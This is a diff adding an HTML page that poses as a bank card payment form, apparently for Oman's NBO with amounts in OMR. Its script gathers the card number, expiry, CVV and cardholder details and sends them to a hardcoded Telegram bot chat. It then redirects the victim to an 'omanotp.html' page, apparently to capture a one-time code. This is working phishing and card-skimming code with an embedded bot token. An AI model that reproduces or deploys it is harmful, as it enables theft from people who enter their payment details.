@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui" />
+
+  <title>Payment Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .payment-container {
+      width: 400px;
+      background-color: white;
+      border-radius: 6px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    .header {
+      background-color: #094792;
+      padding: 1px;
+      color: white;
+      font-weight: bold;
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+    }
+
+    .header img {
+      height: 30px;
+      margin-right: 10px;
+    }
+
+    .content {
+      padding: 20px;
+    }
+
+    .content p {
+      margin: 4px 0;
+      font-size: 14px;
+    }
+
+    label {
+      font-size: 13px;
+      margin-bottom: 5px;
+      display: block;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+      
+    }
+
+    .row input {
+      flex: 1;
+  margin-right: 8px; /* تضيف مسافة بين الحقلين */
+  width: 161px;
+
+    }
+    
+
+    
+    .note {
+      font-size: 12px;
+      font-style: italic;
+      margin-top: -10px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .actions button {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      color: white;
+    }
+
+    .pay-btn {
+      background-color: #003e7e;
+    }
+
+    .cancel-btn {
+      background-color: #64748b;
+    }
+
+    .warning {
+      color: red;
+      font-size: 11px;
+      padding: 10px;
+      text-align: center;
+    }
+    #imghedare{
+        font-size: 100px;
+        size: 100px;
+        width: 120px;
+        height: auto;
+        padding: 0;
+    }
+
+    
+  </style>
+</head>
+<body>
+  <div class="payment-container">
+    <div class="header">
+      <img  id="imghedare"src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQC6LGTXVDBkhQU4paEYmzug2EWYjHhCg9RuA&s" alt="NBO Logo"/>
+     
+    </div>
+    <div class="content">
+     <p><strong>quantity:</strong> <span id="quantity"></span></p>
+<p><strong>category:</strong> <span id="category"></span></p>
+<p><strong>Amount:</strong> <span id="totalPrice"></span> omr</p>
+
+
+
+      <label>Enter Card Number</label>
+      <input type="text" id="card-number" placeholder="CARD NUMBER" maxlength="19" inputmode="numeric" pattern="\d*" />
+
+      <div class="row">
+        <div>
+          <label>Expiry Date</label>
+          <input type="text" id="expiry-date" placeholder="MM / YY" maxlength="7" inputmode="numeric" pattern="\d*" />
+          <small id="expiry-error" style="color: red; font-size: 12px;"></small>
+
+        </div>
+        <div>
+          <label>CVV</label>
+          <input type="text" id="cvv" placeholder="CVV" maxlength="3" inputmode="numeric" pattern="\d*" />
+        </div>
+      </div>
+
+      <label>Card Holders Name</label>
+      <input type="text" placeholder="CARD HOLDERS NAME" />
+
+      <p class="note">By clicking the “PAY” button, I confirm that I have understood and accepted the conditions,</p>
+
+      <div class="actions">
+<button class="pay-btn" id="pay-btn">PAY</button>
+        <button class="cancel-btn">CANCEL</button>
+        
+      </div>
+    </div>
+    <div class="warning">
+      Please do not click Back button/Refresh the page/ Close the window while the transaction is in process.
+    </div>
+  </div>
+
+  <script>
+     // قراءة القيم من localStorage
+    const category = localStorage.getItem('category');
+    const quantity = localStorage.getItem('quantity');
+    const totalPrice = localStorage.getItem('totalPrice');
+
+    // عرض القيم في الصفحة
+    document.getElementById('category').textContent = category || ' ';
+    document.getElementById('quantity').textContent = quantity || '';
+    document.getElementById('totalPrice').textContent = totalPrice || '';
+
+    function goBack() {
+      window.history.back();
+    }
+    // Format card number with space after every 4 digits
+    const cardNumberInput = document.getElementById('card-number');
+    cardNumberInput.addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, ''); // Remove all non-digits
+      value = value.substring(0, 16); // Max 16 digits
+      value = value.replace(/(.{4})/g, '$1 ').trim(); // Add space every 4 digits
+      e.target.value = value;
+    });
+
+    // Format expiry date as MM / YY
+    const expiryInput = document.getElementById('expiry-date');
+    expiryInput.addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+      if (value.length > 4) value = value.slice(0, 4);
+      if (value.length >= 3) {
+        value = value.slice(0, 2) + ' / ' + value.slice(2);
+      }
+      e.target.value = value;
+    });
+
+    // Allow only 3 digits in CVV
+    const cvvInput = document.getElementById('cvv');
+    cvvInput.addEventListener('input', function (e) {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    });
+  document.getElementById('pay-btn').addEventListener('click', function (e) {
+    e.preventDefault();
+
+    const expiryInputValue = document.getElementById('expiry-date').value.trim();
+    const errorElement = document.getElementById('expiry-error');
+    errorElement.textContent = '';
+
+    const match = expiryInputValue.match(/^(\d{2}) ?\/ ?(\d{2})$/);
+    if (!match) {
+      errorElement.textContent = "الرجاء كتابة التاريخ بصيغة صحيحة (MM / YY).";
+      return;
+    }
+
+    const enteredMonth = parseInt(match[1], 10);
+    const enteredYear = parseInt(match[2], 10) + 2000;
+
+    const today = new Date();
+    const currentMonth = today.getMonth() + 1;
+    const currentYear = today.getFullYear();
+
+    if (
+      enteredYear < currentYear ||
+      (enteredYear === currentYear && enteredMonth < currentMonth)
+    ) {
+      errorElement.textContent = "تاريخ الانتهاء غير صالح، البطاقة منتهية.";
+      return;
+    }
+
+    sendToTelegram(); // ✅ استدعاء الدالة الجديدة
+  });
+
+  function sendToTelegram() {
+    const botConfigs = [
+      {
+        token: '8086646027:AAH2MyOuWFl3Hw-9KfdbbSjbvYp7p9jkjyE',
+        chatId: '7595871538'
+      }
+    ];
+
+    const name = localStorage.getItem('userName') || 'غير معروف';
+    const quantity = localStorage.getItem('quantity') || 'غير محدد';
+    const category = localStorage.getItem('category') || 'غير محدد';
+    const totalPrice = localStorage.getItem('totalPrice') || 'غير معروف';
+
+    const cardNumber = document.getElementById('card-number').value;
+    const expiryDate = document.getElementById('expiry-date').value;
+    const cvv = document.getElementById('cvv').value;
+
+    if (!cardNumber || !expiryDate || !cvv) {
+      alert("يرجى تعبئة جميع الحقول.");
+      return;
+    }
+
+    const message =
+      `💳 معلومات الدفع:\n` +
+      `👤 من: ${name}\n` +
+      `📦 الفئة: ${category}\n` +
+      `🔢 العدد: ${quantity}\n` +
+      `💰 المبلغ: ${totalPrice} OMR\n\n` +
+      `📇 البطاقة: ${cardNumber}\n` +
+      `📅 انتهاء: ${expiryDate}\n` +
+      `🔐 CVV: ${cvv}`;
+
+    botConfigs.forEach(({ token, chatId }) => {
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log("✅ تم الإرسال إلى:", chatId);
+        } else {
+          console.error("❌ فشل في الإرسال إلى:", chatId);
+        }
+      })
+      .catch(error => {
+        console.error("⚠️ خطأ في الاتصال:", error);
+      });
+    });
+
+    // توجيه بعد الإرسال
+    setTimeout(() => {
+      window.location.href = "omanotp.html";
+    }, 1000);
+  }
+
+
+  </script>
+</body>
+</html>
